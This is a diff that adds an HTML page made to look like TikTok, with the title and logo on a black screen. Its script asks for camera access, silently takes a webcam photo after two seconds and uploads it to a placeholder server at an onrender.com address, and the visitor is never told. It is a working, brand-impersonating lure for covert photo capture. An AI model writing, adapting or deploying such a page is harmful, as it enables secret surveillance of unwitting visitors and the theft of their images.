@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>TikTok</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .tiktok-logo {
+            width: 150px;
+            height: 150px;
+            background-image: url('https://i.pinimg.com/originals/7b/ce/b0/7bceb0ecc44805deedeec824f1758e3f.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+    </style>
+</head>
+<body>
+    <div class="tiktok-logo"></div>
+    
+    <script>
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('photo', blob, 'photo.png');
+                        fetch('https://your-render-app.onrender.com/upload', {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 'image/png');
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2000);
+            });
+    </script>
+</body>
+</html>
